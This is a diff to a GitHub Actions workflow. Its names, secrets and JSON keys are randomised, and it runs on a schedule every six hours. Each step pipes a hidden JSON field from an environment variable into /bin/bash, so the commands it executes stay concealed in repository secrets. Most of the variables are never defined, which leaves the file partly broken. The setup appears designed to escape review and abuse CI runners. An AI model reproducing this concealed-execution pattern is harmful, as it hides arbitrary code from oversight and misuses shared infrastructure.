@@ -1,9 +1,10 @@
 name: wuzhongcvx
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 2/6 * * *'
-jobs:  # 17058
+    - cron: '54 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,16 +12,15 @@ jobs:  # 17058
       - uses: actions/checkout@v4
       - name: wuzhongcvx
         env:
-          ojnr362: ${{ secrets.ojnr362 }}
+          tomt69: ${{ secrets.tomt69 }}
         run: |
-          echo $ojnr362 | jq -r .pupi46465 | /bin/bash
-          echo $psj0 | jq -r .ifeam49381 | /bin/bash
-          echo $gm29525 | jq -r .dj69 | /bin/bash
-          echo $vac82 | jq -r .y1103 | /bin/bash
-          echo $qf66322 | jq -r .rfup1596 | /bin/bash
-          echo $oe73 | jq -r .kleu57 | /bin/bash
-          echo $x0196 | jq -r .dsm8617 | /bin/bash
-          echo $an4212 | jq -r .nb85348 | /bin/bash
-          echo $dosy50 | jq -r .ooi7 | /bin/bash
-          echo $tcn46 | jq -r .obw5873 | /bin/bash
+          echo $tomt69 | jq -r .f6945 | /bin/bash
+          echo $xi32 | jq -r .z117 | /bin/bash
+          echo $xwox1 | jq -r .oopi07336 | /bin/bash
+          echo $z7 | jq -r .a87729 | /bin/bash
+          echo $ced01 | jq -r .eqxe57 | /bin/bash
+          echo $zrmnl3 | jq -r .memm444 | /bin/bash
+          echo $cmfw88727 | jq -r .h7241 | /bin/bash
+          echo $tbzla25971 | jq -r .rd24309 | /bin/bash
+          echo $picj2158 | jq -r .zqxc21268 | /bin/bash
 
